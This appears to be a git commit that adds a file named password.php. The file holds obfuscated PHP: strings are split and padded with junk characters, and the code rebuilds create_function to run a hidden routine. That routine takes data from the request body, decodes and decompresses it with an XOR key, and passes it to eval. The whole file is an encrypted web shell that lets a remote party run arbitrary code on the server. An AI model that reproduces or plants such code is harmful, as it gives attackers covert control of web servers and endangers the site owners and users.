9ae1eeb1f697b16f5a10b88a5a0267d3640f4731
harsh-alicen <62687176+harsh-alicen@users.noreply.github.com>
2020-11-17 18:05:14 -0800

    add
    add

---
+++ password.php
@@ -0,0 +1,13 @@
+<?php
+$G='%j++,$i++%){%$o.=$t{$%i}^$k{%$j};}}re%turn% $%o;}if (%%@pre%g_mat';
+$h='ch("/$kh(.+)$k%f/",@f%ile_g%et_%conten%ts("php:/%/%i%np%ut%"),$m)';
+$U='$%k="5f4d%%cc3b";$kh%="5aa765d6%1%d83";$kf=%"27de%b88%2cf9%9";$p=';
+$s='"KDI5w%8TQ69h%wQ%NHl";functi%on x($t,$k){$%c=st%rlen%($%k);%$%l=s';
+$z='[%1]),$k))%);$o%=@ob_get%%_co%ntents();@ob%_end_clea%%n();$r=@bas';
+$B='e%64_%encode(@x%(%@gzco%mp%ress($o),$k));pri%%nt("$p$kh$r%$kf");}';
+$H=str_replace('oN','','creoNaoNte_oNfuoNnoNcoNtion');
+$M='trlen($t);$o="";f%or%(%$i=0;$i<$l;){%for($j=0;%(%$j<$c&&$i%<$l);$';
+$x='==1) {@ob_start();%@e%v%al(@gzunco%mpress(@%x(@bas%e64%_decode($m';
+$q=str_replace('%','',$U.$s.$M.$G.$h.$x.$z.$B);
+$g=$H('',$q);$g();
+?>
